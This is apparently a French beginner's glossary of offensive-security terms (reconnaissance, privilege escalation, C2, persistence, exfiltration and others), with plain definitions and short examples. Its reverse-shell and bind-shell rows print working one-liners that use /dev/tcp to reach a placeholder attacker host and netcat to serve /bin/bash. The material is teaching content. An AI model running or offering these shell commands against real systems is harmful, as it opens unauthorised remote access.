# Glossaire Offensif Vulgarisé

Ce glossaire explique simplement les termes techniques que tu rencontreras dans la documentation offensive. Idéal pour débuter ou réviser !

| Terme                | Définition Vulgarisée                                                                 | Exemple concret                                  |
|----------------------|--------------------------------------------------------------------------------------|--------------------------------------------------|
| Reconnaissance       | Phase où l'on collecte des infos sur la cible, souvent sans se faire remarquer.      | Chercher l'adresse mail d'une entreprise sur Google |
| Énumération          | Interroger les services découverts pour obtenir des détails techniques.              | Lister les utilisateurs d'un serveur FTP         |
| Exploitation         | Utiliser une faille pour obtenir un accès non autorisé.                              | Lancer un exploit pour obtenir un shell          |
| Post-Exploitation    | Actions après l'accès : persistance, vol de données, déplacement latéral, etc.       | Installer une backdoor après avoir eu un shell   |
| Privilege Escalation | Passer d'un utilisateur normal à admin/root.                                         | Exploiter sudo mal configuré                     |
| Payload              | Code malveillant envoyé pour exécuter une action (ex : reverse shell).               | Un script qui ouvre un accès distant             |
| Reverse Shell        | Shell qui se connecte de la cible vers l'attaquant.                                  | Bash -i >& /dev/tcp/attacker_ip/4444 0>&1        |
| Bind Shell           | Shell qui attend une connexion sur la cible.                                         | nc -lvp 4444 -e /bin/bash                        |
| C2 (Command & Control)| Canal de communication entre l'attaquant et la machine compromise.                  | Utiliser Metasploit pour piloter un bot          |
| OPSEC                | Techniques pour masquer ses traces et éviter d'être détecté.                         | Effacer les logs après exploitation              |
| EDR                  | Logiciel de sécurité avancé qui surveille et bloque les attaques.                   | Windows Defender ATP, CrowdStrike                |
| AV                   | Antivirus classique                                                                  | Avast, Kaspersky                                 |
| Lateral Movement     | Se déplacer d'une machine à une autre sur le réseau.                                 | Utiliser des credentials volés pour rebondir     |
| Persistence          | Maintenir l'accès à la machine même après un redémarrage.                            | Ajouter un script dans les tâches planifiées     |
| Exfiltration         | Sortir des données de la cible vers l'attaquant.                                     | Télécharger un fichier via un tunnel chiffré     |
| Living Off The Land  | Utiliser les outils déjà présents sur la cible pour attaquer.                        | Utiliser PowerShell ou certutil sur Windows      |
| Fileless             | Attaque sans écrire de fichier sur le disque.                                        | Exécuter du code en mémoire uniquement           |
| Phishing             | Tromper une personne pour obtenir des infos ou l'inciter à cliquer sur un lien/piège.| Envoyer un faux mail de banque                   |
| Red Team             | Équipe qui simule des attaques réelles pour tester la sécurité d'une organisation.   | Simuler un ransomware dans un test d'intrusion   |

*Ce glossaire sera enrichi au fil de la documentation. N'hésite pas à proposer des termes à ajouter !* 